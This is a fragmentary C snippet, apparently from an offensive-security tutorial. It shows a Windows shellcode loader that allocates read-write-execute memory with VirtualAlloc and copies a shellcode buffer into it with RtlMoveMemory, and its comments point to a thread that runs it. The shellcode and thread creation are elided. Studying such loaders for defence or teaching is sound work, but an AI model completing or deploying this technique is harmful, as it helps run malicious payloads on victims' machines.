...
int main() {
    ...
    LPVOID exec_mem = VirtualAlloc(NULL,
                            sizeof(shellcode),
                            MEM_COMMIT | MEM_RESERVE,
                            PAGE_EXECUTE_READWRITE);

    if(exec_mem == NULL) {
        printf("Failed to allocate to memory to shellcode : %d\n", GetLastError());
    }

    //copy the shellcode to allocated memory
    RtlMoveMemory(exec_mem,
                shellcode,
                sizeof(shellcode));

    //create a new thread to execute a shellcode
    ...
    //wait for shellcode to executing
